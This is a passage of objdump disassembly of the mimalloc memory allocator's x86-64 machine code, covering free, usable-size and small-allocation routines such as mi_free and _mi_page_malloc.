  401b6b:	48 8b 47 40          	mov    0x40(%rdi),%rax
  401b6f:	48 85 c0             	test   %rax,%rax
  401b72:	75 1c                	jne    401b90 <mi_free_block_delayed_mt+0x60>
  401b74:	48 8b 47 38          	mov    0x38(%rdi),%rax
  401b78:	48 89 c2             	mov    %rax,%rdx
  401b7b:	48 83 e2 fc          	and    $0xfffffffffffffffc,%rdx
  401b7f:	48 83 ca 02          	or     $0x2,%rdx
  401b83:	f0 48 0f b1 11       	lock cmpxchg %rdx,(%rcx)
  401b88:	75 ee                	jne    401b78 <mi_free_block_delayed_mt+0x48>
  401b8a:	c3                   	retq   
  401b8b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401b90:	48 8d 50 08          	lea    0x8(%rax),%rdx
  401b94:	48 8b 40 08          	mov    0x8(%rax),%rax
  401b98:	48 89 06             	mov    %rax,(%rsi)
  401b9b:	f0 48 0f b1 32       	lock cmpxchg %rsi,(%rdx)
  401ba0:	74 d2                	je     401b74 <mi_free_block_delayed_mt+0x44>
  401ba2:	eb f4                	jmp    401b98 <mi_free_block_delayed_mt+0x68>
  401ba4:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  401bab:	00 00 00 00 
  401baf:	90                   	nop

0000000000401bb0 <mi_free_generic_local.isra.12>:
  401bb0:	f6 47 0e 02          	testb  $0x2,0xe(%rdi)
  401bb4:	74 22                	je     401bd8 <mi_free_generic_local.isra.12+0x28>
  401bb6:	0f b6 4f 22          	movzbl 0x22(%rdi),%ecx
  401bba:	48 89 f2             	mov    %rsi,%rdx
  401bbd:	48 2b 57 30          	sub    0x30(%rdi),%rdx
  401bc1:	84 c9                	test   %cl,%cl
  401bc3:	74 33                	je     401bf8 <mi_free_generic_local.isra.12+0x48>
  401bc5:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
  401bcc:	49 d3 e0             	shl    %cl,%r8
  401bcf:	49 f7 d0             	not    %r8
  401bd2:	4c 21 c2             	and    %r8,%rdx
  401bd5:	48 29 d6             	sub    %rdx,%rsi
  401bd8:	48 8b 47 18          	mov    0x18(%rdi),%rax
  401bdc:	48 89 06             	mov    %rax,(%rsi)
  401bdf:	66 83 6f 20 01       	subw   $0x1,0x20(%rdi)
  401be4:	48 89 77 18          	mov    %rsi,0x18(%rdi)
  401be8:	74 1e                	je     401c08 <mi_free_generic_local.isra.12+0x58>
  401bea:	f6 47 0e 01          	testb  $0x1,0xe(%rdi)
  401bee:	75 1d                	jne    401c0d <mi_free_generic_local.isra.12+0x5d>
  401bf0:	c3                   	retq   
  401bf1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401bf8:	48 89 d0             	mov    %rdx,%rax
  401bfb:	31 d2                	xor    %edx,%edx
  401bfd:	48 f7 77 28          	divq   0x28(%rdi)
  401c01:	eb d2                	jmp    401bd5 <mi_free_generic_local.isra.12+0x25>
  401c03:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401c08:	e9 43 c3 00 00       	jmpq   40df50 <_mi_page_retire>
  401c0d:	e9 0e b4 00 00       	jmpq   40d020 <_mi_page_unfull>
  401c12:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  401c19:	00 00 00 00 
  401c1d:	0f 1f 00             	nopl   (%rax)

0000000000401c20 <_mi_page_ptr_unalign>:
  401c20:	0f b6 4f 22          	movzbl 0x22(%rdi),%ecx
  401c24:	48 89 f2             	mov    %rsi,%rdx
  401c27:	48 2b 57 30          	sub    0x30(%rdi),%rdx
  401c2b:	84 c9                	test   %cl,%cl
  401c2d:	74 21                	je     401c50 <_mi_page_ptr_unalign+0x30>
  401c2f:	48 c7 c7 ff ff ff ff 	mov    $0xffffffffffffffff,%rdi
  401c36:	48 d3 e7             	shl    %cl,%rdi
  401c39:	48 f7 d7             	not    %rdi
  401c3c:	48 21 fa             	and    %rdi,%rdx
  401c3f:	48 89 f0             	mov    %rsi,%rax
  401c42:	48 29 d0             	sub    %rdx,%rax
  401c45:	c3                   	retq   
  401c46:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  401c4d:	00 00 00 
  401c50:	48 89 d0             	mov    %rdx,%rax
  401c53:	31 d2                	xor    %edx,%edx
  401c55:	48 f7 77 28          	divq   0x28(%rdi)
  401c59:	eb e4                	jmp    401c3f <_mi_page_ptr_unalign+0x1f>
  401c5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000401c60 <mi_free>:
  401c60:	48 8d 77 ff          	lea    -0x1(%rdi),%rsi
  401c64:	48 81 e6 00 00 00 fe 	and    $0xfffffffffe000000,%rsi
  401c6b:	7e 5c                	jle    401cc9 <mi_free+0x69>
  401c6d:	48 89 f8             	mov    %rdi,%rax
  401c70:	48 29 f0             	sub    %rsi,%rax
  401c73:	48 c1 e8 10          	shr    $0x10,%rax
  401c77:	48 8d 14 40          	lea    (%rax,%rax,2),%rdx
  401c7b:	48 c1 e2 05          	shl    $0x5,%rdx
  401c7f:	48 8d 82 20 01 00 00 	lea    0x120(%rdx),%rax
  401c86:	64 4c 8b 04 25 00 00 	mov    %fs:0x0,%r8
  401c8d:	00 00 
  401c8f:	48 8b 8e 18 01 00 00 	mov    0x118(%rsi),%rcx
  401c96:	8b 94 16 24 01 00 00 	mov    0x124(%rsi,%rdx,1),%edx
  401c9d:	48 29 d0             	sub    %rdx,%rax
  401ca0:	48 01 f0             	add    %rsi,%rax
  401ca3:	49 39 c8             	cmp    %rcx,%r8
  401ca6:	75 38                	jne    401ce0 <mi_free+0x80>
  401ca8:	80 78 0e 00          	cmpb   $0x0,0xe(%rax)
  401cac:	75 42                	jne    401cf0 <mi_free+0x90>
  401cae:	48 8b 50 18          	mov    0x18(%rax),%rdx
  401cb2:	0f b7 48 20          	movzwl 0x20(%rax),%ecx
  401cb6:	48 89 17             	mov    %rdx,(%rdi)
  401cb9:	8d 51 ff             	lea    -0x1(%rcx),%edx
  401cbc:	48 89 78 18          	mov    %rdi,0x18(%rax)
  401cc0:	66 89 50 20          	mov    %dx,0x20(%rax)
  401cc4:	66 85 d2             	test   %dx,%dx
  401cc7:	74 07                	je     401cd0 <mi_free+0x70>
  401cc9:	c3                   	retq   
  401cca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401cd0:	48 89 c7             	mov    %rax,%rdi
  401cd3:	e9 78 c2 00 00       	jmpq   40df50 <_mi_page_retire>
  401cd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  401cdf:	00 
  401ce0:	48 89 fa             	mov    %rdi,%rdx
  401ce3:	48 89 c7             	mov    %rax,%rdi
  401ce6:	e9 b5 00 00 00       	jmpq   401da0 <mi_free_generic_mt>
  401ceb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401cf0:	48 89 fe             	mov    %rdi,%rsi
  401cf3:	48 89 c7             	mov    %rax,%rdi
  401cf6:	e9 b5 fe ff ff       	jmpq   401bb0 <mi_free_generic_local.isra.12>
  401cfb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000401d00 <mi_free_block_mt>:
  401d00:	41 54                	push   %r12
  401d02:	49 89 fc             	mov    %rdi,%r12
  401d05:	bf 1a 00 00 00       	mov    $0x1a,%edi
  401d0a:	55                   	push   %rbp
  401d0b:	48 89 d5             	mov    %rdx,%rbp
  401d0e:	53                   	push   %rbx
  401d0f:	48 89 f3             	mov    %rsi,%rbx
  401d12:	e8 a9 6a 00 00       	callq  4087c0 <_mi_option_get_fast>
  401d17:	48 85 c0             	test   %rax,%rax
  401d1a:	75 1c                	jne    401d38 <mi_free_block_mt+0x38>
  401d1c:	83 bb 08 01 00 00 01 	cmpl   $0x1,0x108(%rbx)
  401d23:	74 5b                	je     401d80 <mi_free_block_mt+0x80>
  401d25:	5b                   	pop    %rbx
  401d26:	48 89 ee             	mov    %rbp,%rsi
  401d29:	4c 89 e7             	mov    %r12,%rdi
  401d2c:	5d                   	pop    %rbp
  401d2d:	41 5c                	pop    %r12
  401d2f:	e9 fc fd ff ff       	jmpq   401b30 <mi_free_block_delayed_mt>
  401d34:	0f 1f 40 00          	nopl   0x0(%rax)
  401d38:	48 8b 83 18 01 00 00 	mov    0x118(%rbx),%rax
  401d3f:	48 85 c0             	test   %rax,%rax
  401d42:	75 d8                	jne    401d1c <mi_free_block_mt+0x1c>
  401d44:	48 c7 c2 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rdx
  401d4b:	48 8d 05 6e 24 22 00 	lea    0x22246e(%rip),%rax        # 6241c0 <_mi_heap_empty>
  401d52:	64 48 39 02          	cmp    %rax,%fs:(%rdx)
  401d56:	74 c4                	je     401d1c <mi_free_block_mt+0x1c>
  401d58:	e8 53 3f 00 00       	callq  405cb0 <mi_heap_get_default>
  401d5d:	48 89 de             	mov    %rbx,%rsi
  401d60:	48 89 c7             	mov    %rax,%rdi
  401d63:	e8 e8 18 01 00       	callq  413650 <_mi_segment_attempt_reclaim>
  401d68:	84 c0                	test   %al,%al
  401d6a:	74 b0                	je     401d1c <mi_free_block_mt+0x1c>
  401d6c:	5b                   	pop    %rbx
  401d6d:	48 89 ef             	mov    %rbp,%rdi
  401d70:	5d                   	pop    %rbp
  401d71:	41 5c                	pop    %r12
  401d73:	e9 e8 fe ff ff       	jmpq   401c60 <mi_free>
  401d78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  401d7f:	00 
  401d80:	4c 89 e6             	mov    %r12,%rsi
  401d83:	48 89 df             	mov    %rbx,%rdi
  401d86:	48 89 ea             	mov    %rbp,%rdx
  401d89:	e8 72 1b 01 00       	callq  413900 <_mi_segment_huge_page_reset>
  401d8e:	5b                   	pop    %rbx
  401d8f:	48 89 ee             	mov    %rbp,%rsi
  401d92:	4c 89 e7             	mov    %r12,%rdi
  401d95:	5d                   	pop    %rbp
  401d96:	41 5c                	pop    %r12
  401d98:	e9 93 fd ff ff       	jmpq   401b30 <mi_free_block_delayed_mt>
  401d9d:	0f 1f 00             	nopl   (%rax)

0000000000401da0 <mi_free_generic_mt>:
  401da0:	0f b6 4f 22          	movzbl 0x22(%rdi),%ecx
  401da4:	49 89 d1             	mov    %rdx,%r9
  401da7:	48 2b 57 30          	sub    0x30(%rdi),%rdx
  401dab:	84 c9                	test   %cl,%cl
  401dad:	74 21                	je     401dd0 <mi_free_generic_mt+0x30>
  401daf:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
  401db6:	49 d3 e0             	shl    %cl,%r8
  401db9:	49 f7 d0             	not    %r8
  401dbc:	4c 21 c2             	and    %r8,%rdx
  401dbf:	49 29 d1             	sub    %rdx,%r9
  401dc2:	4c 89 ca             	mov    %r9,%rdx
  401dc5:	e9 36 ff ff ff       	jmpq   401d00 <mi_free_block_mt>
  401dca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401dd0:	48 89 d0             	mov    %rdx,%rax
  401dd3:	31 d2                	xor    %edx,%edx
  401dd5:	48 f7 77 28          	divq   0x28(%rdi)
  401dd9:	eb e4                	jmp    401dbf <mi_free_generic_mt+0x1f>
  401ddb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000401de0 <_mi_free_generic>:
  401de0:	48 89 f0             	mov    %rsi,%rax
  401de3:	84 d2                	test   %dl,%dl
  401de5:	74 11                	je     401df8 <_mi_free_generic+0x18>
  401de7:	48 89 ce             	mov    %rcx,%rsi
  401dea:	48 89 c7             	mov    %rax,%rdi
  401ded:	e9 be fd ff ff       	jmpq   401bb0 <mi_free_generic_local.isra.12>
  401df2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401df8:	48 89 fe             	mov    %rdi,%rsi
  401dfb:	48 89 ca             	mov    %rcx,%rdx
  401dfe:	48 89 c7             	mov    %rax,%rdi
  401e01:	eb 9d                	jmp    401da0 <mi_free_generic_mt>
  401e03:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  401e0a:	00 00 00 00 
  401e0e:	66 90                	xchg   %ax,%ax

0000000000401e10 <_mi_free_delayed_block>:
  401e10:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
  401e14:	ba 00 00 00 00       	mov    $0x0,%edx
  401e19:	41 54                	push   %r12
  401e1b:	48 25 00 00 00 fe    	and    $0xfffffffffe000000,%rax
  401e21:	55                   	push   %rbp
  401e22:	48 89 fd             	mov    %rdi,%rbp
  401e25:	48 0f 4e c2          	cmovle %rdx,%rax
  401e29:	48 89 fa             	mov    %rdi,%rdx
  401e2c:	53                   	push   %rbx
  401e2d:	31 f6                	xor    %esi,%esi
  401e2f:	48 29 c2             	sub    %rax,%rdx
  401e32:	48 c1 ea 10          	shr    $0x10,%rdx
  401e36:	48 8d 14 52          	lea    (%rdx,%rdx,2),%rdx
  401e3a:	48 c1 e2 05          	shl    $0x5,%rdx
  401e3e:	48 8d 9a 20 01 00 00 	lea    0x120(%rdx),%rbx
  401e45:	8b 94 10 24 01 00 00 	mov    0x124(%rax,%rdx,1),%edx
  401e4c:	48 29 d3             	sub    %rdx,%rbx
  401e4f:	31 d2                	xor    %edx,%edx
  401e51:	48 01 c3             	add    %rax,%rbx
  401e54:	48 89 df             	mov    %rbx,%rdi
  401e57:	e8 74 ab 00 00       	callq  40c9d0 <_mi_page_try_use_delayed_free>
  401e5c:	41 89 c4             	mov    %eax,%r12d
  401e5f:	84 c0                	test   %al,%al
  401e61:	75 0d                	jne    401e70 <_mi_free_delayed_block+0x60>
  401e63:	44 89 e0             	mov    %r12d,%eax
  401e66:	5b                   	pop    %rbx
  401e67:	5d                   	pop    %rbp
  401e68:	41 5c                	pop    %r12
  401e6a:	c3                   	retq   
  401e6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401e70:	31 f6                	xor    %esi,%esi
  401e72:	48 89 df             	mov    %rbx,%rdi
  401e75:	e8 b6 ab 00 00       	callq  40ca30 <_mi_page_free_collect>
  401e7a:	48 8b 43 18          	mov    0x18(%rbx),%rax
  401e7e:	48 89 45 00          	mov    %rax,0x0(%rbp)
  401e82:	66 83 6b 20 01       	subw   $0x1,0x20(%rbx)
  401e87:	48 89 6b 18          	mov    %rbp,0x18(%rbx)
  401e8b:	74 1b                	je     401ea8 <_mi_free_delayed_block+0x98>
  401e8d:	0f b6 6b 0e          	movzbl 0xe(%rbx),%ebp
  401e91:	83 e5 01             	and    $0x1,%ebp
  401e94:	74 cd                	je     401e63 <_mi_free_delayed_block+0x53>
  401e96:	48 89 df             	mov    %rbx,%rdi
  401e99:	41 89 ec             	mov    %ebp,%r12d
  401e9c:	e8 7f b1 00 00       	callq  40d020 <_mi_page_unfull>
  401ea1:	eb c0                	jmp    401e63 <_mi_free_delayed_block+0x53>
  401ea3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401ea8:	48 89 df             	mov    %rbx,%rdi
  401eab:	e8 a0 c0 00 00       	callq  40df50 <_mi_page_retire>
  401eb0:	eb b1                	jmp    401e63 <_mi_free_delayed_block+0x53>
  401eb2:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  401eb9:	00 00 00 00 
  401ebd:	0f 1f 00             	nopl   (%rax)

0000000000401ec0 <mi_usable_size>:
  401ec0:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
  401ec4:	48 25 00 00 00 fe    	and    $0xfffffffffe000000,%rax
  401eca:	7e 34                	jle    401f00 <mi_usable_size+0x40>
  401ecc:	48 89 fa             	mov    %rdi,%rdx
  401ecf:	48 29 c2             	sub    %rax,%rdx
  401ed2:	48 c1 ea 10          	shr    $0x10,%rdx
  401ed6:	48 8d 14 52          	lea    (%rdx,%rdx,2),%rdx
  401eda:	48 c1 e2 05          	shl    $0x5,%rdx
  401ede:	48 8d 8a 20 01 00 00 	lea    0x120(%rdx),%rcx
  401ee5:	8b 94 10 24 01 00 00 	mov    0x124(%rax,%rdx,1),%edx
  401eec:	48 29 d1             	sub    %rdx,%rcx
  401eef:	48 01 c8             	add    %rcx,%rax
  401ef2:	f6 40 0e 02          	testb  $0x2,0xe(%rax)
  401ef6:	75 10                	jne    401f08 <mi_usable_size+0x48>
  401ef8:	48 8b 40 28          	mov    0x28(%rax),%rax
  401efc:	c3                   	retq   
  401efd:	0f 1f 00             	nopl   (%rax)
  401f00:	31 c0                	xor    %eax,%eax
  401f02:	c3                   	retq   
  401f03:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401f08:	48 89 fe             	mov    %rdi,%rsi
  401f0b:	48 89 c7             	mov    %rax,%rdi
  401f0e:	e9 dd fb ff ff       	jmpq   401af0 <mi_page_usable_aligned_size_of>
  401f13:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  401f1a:	00 00 00 00 
  401f1e:	66 90                	xchg   %ax,%ax

0000000000401f20 <mi_free_size>:
  401f20:	48 8d 77 ff          	lea    -0x1(%rdi),%rsi
  401f24:	48 81 e6 00 00 00 fe 	and    $0xfffffffffe000000,%rsi
  401f2b:	7e 5c                	jle    401f89 <mi_free_size+0x69>
  401f2d:	48 89 f8             	mov    %rdi,%rax
  401f30:	48 29 f0             	sub    %rsi,%rax
  401f33:	48 c1 e8 10          	shr    $0x10,%rax
  401f37:	48 8d 14 40          	lea    (%rax,%rax,2),%rdx
  401f3b:	48 c1 e2 05          	shl    $0x5,%rdx
  401f3f:	48 8d 82 20 01 00 00 	lea    0x120(%rdx),%rax
  401f46:	64 4c 8b 04 25 00 00 	mov    %fs:0x0,%r8
  401f4d:	00 00 
  401f4f:	48 8b 8e 18 01 00 00 	mov    0x118(%rsi),%rcx
  401f56:	8b 94 16 24 01 00 00 	mov    0x124(%rsi,%rdx,1),%edx
  401f5d:	48 29 d0             	sub    %rdx,%rax
  401f60:	48 01 f0             	add    %rsi,%rax
  401f63:	49 39 c8             	cmp    %rcx,%r8
  401f66:	75 38                	jne    401fa0 <mi_free_size+0x80>
  401f68:	80 78 0e 00          	cmpb   $0x0,0xe(%rax)
  401f6c:	75 42                	jne    401fb0 <mi_free_size+0x90>
  401f6e:	48 8b 50 18          	mov    0x18(%rax),%rdx
  401f72:	0f b7 48 20          	movzwl 0x20(%rax),%ecx
  401f76:	48 89 17             	mov    %rdx,(%rdi)
  401f79:	8d 51 ff             	lea    -0x1(%rcx),%edx
  401f7c:	48 89 78 18          	mov    %rdi,0x18(%rax)
  401f80:	66 89 50 20          	mov    %dx,0x20(%rax)
  401f84:	66 85 d2             	test   %dx,%dx
  401f87:	74 07                	je     401f90 <mi_free_size+0x70>
  401f89:	c3                   	retq   
  401f8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401f90:	48 89 c7             	mov    %rax,%rdi
  401f93:	e9 b8 bf 00 00       	jmpq   40df50 <_mi_page_retire>
  401f98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  401f9f:	00 
  401fa0:	48 89 fa             	mov    %rdi,%rdx
  401fa3:	48 89 c7             	mov    %rax,%rdi
  401fa6:	e9 f5 fd ff ff       	jmpq   401da0 <mi_free_generic_mt>
  401fab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401fb0:	48 89 fe             	mov    %rdi,%rsi
  401fb3:	48 89 c7             	mov    %rax,%rdi
  401fb6:	e9 f5 fb ff ff       	jmpq   401bb0 <mi_free_generic_local.isra.12>
  401fbb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000401fc0 <mi_free_size_aligned>:
  401fc0:	48 8d 77 ff          	lea    -0x1(%rdi),%rsi
  401fc4:	48 81 e6 00 00 00 fe 	and    $0xfffffffffe000000,%rsi
  401fcb:	7e 5c                	jle    402029 <mi_free_size_aligned+0x69>
  401fcd:	48 89 f8             	mov    %rdi,%rax
  401fd0:	48 29 f0             	sub    %rsi,%rax
  401fd3:	48 c1 e8 10          	shr    $0x10,%rax
  401fd7:	48 8d 14 40          	lea    (%rax,%rax,2),%rdx
  401fdb:	48 c1 e2 05          	shl    $0x5,%rdx
  401fdf:	48 8d 82 20 01 00 00 	lea    0x120(%rdx),%rax
  401fe6:	64 4c 8b 04 25 00 00 	mov    %fs:0x0,%r8
  401fed:	00 00 
  401fef:	48 8b 8e 18 01 00 00 	mov    0x118(%rsi),%rcx
  401ff6:	8b 94 16 24 01 00 00 	mov    0x124(%rsi,%rdx,1),%edx
  401ffd:	48 29 d0             	sub    %rdx,%rax
  402000:	48 01 f0             	add    %rsi,%rax
  402003:	49 39 c8             	cmp    %rcx,%r8
  402006:	75 38                	jne    402040 <mi_free_size_aligned+0x80>
  402008:	80 78 0e 00          	cmpb   $0x0,0xe(%rax)
  40200c:	75 42                	jne    402050 <mi_free_size_aligned+0x90>
  40200e:	48 8b 50 18          	mov    0x18(%rax),%rdx
  402012:	0f b7 48 20          	movzwl 0x20(%rax),%ecx
  402016:	48 89 17             	mov    %rdx,(%rdi)
  402019:	8d 51 ff             	lea    -0x1(%rcx),%edx
  40201c:	48 89 78 18          	mov    %rdi,0x18(%rax)
  402020:	66 89 50 20          	mov    %dx,0x20(%rax)
  402024:	66 85 d2             	test   %dx,%dx
  402027:	74 07                	je     402030 <mi_free_size_aligned+0x70>
  402029:	c3                   	retq   
  40202a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402030:	48 89 c7             	mov    %rax,%rdi
  402033:	e9 18 bf 00 00       	jmpq   40df50 <_mi_page_retire>
  402038:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40203f:	00 
  402040:	48 89 fa             	mov    %rdi,%rdx
  402043:	48 89 c7             	mov    %rax,%rdi
  402046:	e9 55 fd ff ff       	jmpq   401da0 <mi_free_generic_mt>
  40204b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402050:	48 89 fe             	mov    %rdi,%rsi
  402053:	48 89 c7             	mov    %rax,%rdi
  402056:	e9 55 fb ff ff       	jmpq   401bb0 <mi_free_generic_local.isra.12>
  40205b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000402060 <mi_free_aligned>:
  402060:	48 8d 77 ff          	lea    -0x1(%rdi),%rsi
  402064:	48 81 e6 00 00 00 fe 	and    $0xfffffffffe000000,%rsi
  40206b:	7e 5c                	jle    4020c9 <mi_free_aligned+0x69>
  40206d:	48 89 f8             	mov    %rdi,%rax
  402070:	48 29 f0             	sub    %rsi,%rax
  402073:	48 c1 e8 10          	shr    $0x10,%rax
  402077:	48 8d 14 40          	lea    (%rax,%rax,2),%rdx
  40207b:	48 c1 e2 05          	shl    $0x5,%rdx
  40207f:	48 8d 82 20 01 00 00 	lea    0x120(%rdx),%rax
  402086:	64 4c 8b 04 25 00 00 	mov    %fs:0x0,%r8
  40208d:	00 00 
  40208f:	48 8b 8e 18 01 00 00 	mov    0x118(%rsi),%rcx
  402096:	8b 94 16 24 01 00 00 	mov    0x124(%rsi,%rdx,1),%edx
  40209d:	48 29 d0             	sub    %rdx,%rax
  4020a0:	48 01 f0             	add    %rsi,%rax
  4020a3:	49 39 c8             	cmp    %rcx,%r8
  4020a6:	75 38                	jne    4020e0 <mi_free_aligned+0x80>
  4020a8:	80 78 0e 00          	cmpb   $0x0,0xe(%rax)
  4020ac:	75 42                	jne    4020f0 <mi_free_aligned+0x90>
  4020ae:	48 8b 50 18          	mov    0x18(%rax),%rdx
  4020b2:	0f b7 48 20          	movzwl 0x20(%rax),%ecx
  4020b6:	48 89 17             	mov    %rdx,(%rdi)
  4020b9:	8d 51 ff             	lea    -0x1(%rcx),%edx
  4020bc:	48 89 78 18          	mov    %rdi,0x18(%rax)
  4020c0:	66 89 50 20          	mov    %dx,0x20(%rax)
  4020c4:	66 85 d2             	test   %dx,%dx
  4020c7:	74 07                	je     4020d0 <mi_free_aligned+0x70>
  4020c9:	c3                   	retq   
  4020ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4020d0:	48 89 c7             	mov    %rax,%rdi
  4020d3:	e9 78 be 00 00       	jmpq   40df50 <_mi_page_retire>
  4020d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4020df:	00 
  4020e0:	48 89 fa             	mov    %rdi,%rdx
  4020e3:	48 89 c7             	mov    %rax,%rdi
  4020e6:	e9 b5 fc ff ff       	jmpq   401da0 <mi_free_generic_mt>
  4020eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4020f0:	48 89 fe             	mov    %rdi,%rsi
  4020f3:	48 89 c7             	mov    %rax,%rdi
  4020f6:	e9 b5 fa ff ff       	jmpq   401bb0 <mi_free_generic_local.isra.12>
  4020fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000402100 <_mi_padding_shrink>:
  402100:	c3                   	retq   
  402101:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  402108:	00 00 00 00 
  40210c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000402110 <_mi_page_malloc_zero>:
  402110:	4c 8b 46 10          	mov    0x10(%rsi),%r8
  402114:	4d 85 c0             	test   %r8,%r8
  402117:	74 17                	je     402130 <_mi_page_malloc_zero+0x20>
  402119:	49 8b 00             	mov    (%r8),%rax
  40211c:	66 83 46 20 01       	addw   $0x1,0x20(%rsi)
  402121:	48 89 46 10          	mov    %rax,0x10(%rsi)
  402125:	84 c9                	test   %cl,%cl
  402127:	75 17                	jne    402140 <_mi_page_malloc_zero+0x30>
  402129:	4c 89 c0             	mov    %r8,%rax
  40212c:	c3                   	retq   
  40212d:	0f 1f 00             	nopl   (%rax)
  402130:	48 89 d0             	mov    %rdx,%rax
  402133:	0f b6 d1             	movzbl %cl,%edx
  402136:	31 c9                	xor    %ecx,%ecx
  402138:	48 89 c6             	mov    %rax,%rsi
  40213b:	e9 30 d0 00 00       	jmpq   40f170 <_mi_malloc_generic>
  402140:	f6 46 0f 01          	testb  $0x1,0xf(%rsi)
  402144:	74 0a                	je     402150 <_mi_page_malloc_zero+0x40>
  402146:	49 c7 00 00 00 00 00 	movq   $0x0,(%r8)
  40214d:	eb da                	jmp    402129 <_mi_page_malloc_zero+0x19>
  40214f:	90                   	nop
  402150:	48 83 ec 08          	sub    $0x8,%rsp
  402154:	48 8b 56 28          	mov    0x28(%rsi),%rdx
  402158:	4c 89 c7             	mov    %r8,%rdi
  40215b:	31 f6                	xor    %esi,%esi
  40215d:	e8 fe ec ff ff       	callq  400e60 <memset@plt>
  402162:	48 83 c4 08          	add    $0x8,%rsp
  402166:	c3                   	retq   
  402167:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40216e:	00 00 

0000000000402170 <_mi_page_malloc>:
  402170:	48 8b 46 10          	mov    0x10(%rsi),%rax
  402174:	49 89 d0             	mov    %rdx,%r8
  402177:	48 85 c0             	test   %rax,%rax
  40217a:	74 14                	je     402190 <_mi_page_malloc+0x20>
  40217c:	48 8b 10             	mov    (%rax),%rdx
  40217f:	66 83 46 20 01       	addw   $0x1,0x20(%rsi)
  402184:	48 89 56 10          	mov    %rdx,0x10(%rsi)
  402188:	c3                   	retq   
  402189:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402190:	31 c9                	xor    %ecx,%ecx
  402192:	31 d2                	xor    %edx,%edx
  402194:	4c 89 c6             	mov    %r8,%rsi
  402197:	e9 d4 cf 00 00       	jmpq   40f170 <_mi_malloc_generic>
  40219c:	0f 1f 40 00          	nopl   0x0(%rax)

00000000004021a0 <_mi_page_malloc_zeroed>:
  4021a0:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
  4021a4:	48 85 c9             	test   %rcx,%rcx
  4021a7:	74 27                	je     4021d0 <_mi_page_malloc_zeroed+0x30>
  4021a9:	48 8b 01             	mov    (%rcx),%rax
  4021ac:	66 83 46 20 01       	addw   $0x1,0x20(%rsi)
  4021b1:	48 89 46 10          	mov    %rax,0x10(%rsi)
  4021b5:	f6 46 0f 01          	testb  $0x1,0xf(%rsi)
  4021b9:	74 25                	je     4021e0 <_mi_page_malloc_zeroed+0x40>
  4021bb:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
  4021c2:	48 89 c8             	mov    %rcx,%rax
  4021c5:	c3                   	retq   
  4021c6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  4021cd:	00 00 00 
  4021d0:	48 89 d0             	mov    %rdx,%rax
  4021d3:	ba 01 00 00 00       	mov    $0x1,%edx
  4021d8:	48 89 c6             	mov    %rax,%rsi
  4021db:	e9 90 cf 00 00       	jmpq   40f170 <_mi_malloc_generic>
  4021e0:	48 83 ec 08          	sub    $0x8,%rsp
  4021e4:	48 8b 56 28          	mov    0x28(%rsi),%rdx
  4021e8:	48 89 cf             	mov    %rcx,%rdi
  4021eb:	31 f6                	xor    %esi,%esi
  4021ed:	e8 6e ec ff ff       	callq  400e60 <memset@plt>
  4021f2:	48 83 c4 08          	add    $0x8,%rsp
  4021f6:	c3                   	retq   
  4021f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4021fe:	00 00 

0000000000402200 <mi_heap_malloc_small>:
  402200:	48 8d 46 07          	lea    0x7(%rsi),%rax
  402204:	48 c1 e8 03          	shr    $0x3,%rax
  402208:	48 8b 94 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%rdx
  40220f:	00 
  402210:	48 8b 42 10          	mov    0x10(%rdx),%rax
  402214:	48 85 c0             	test   %rax,%rax
  402217:	74 17                	je     402230 <mi_heap_malloc_small+0x30>
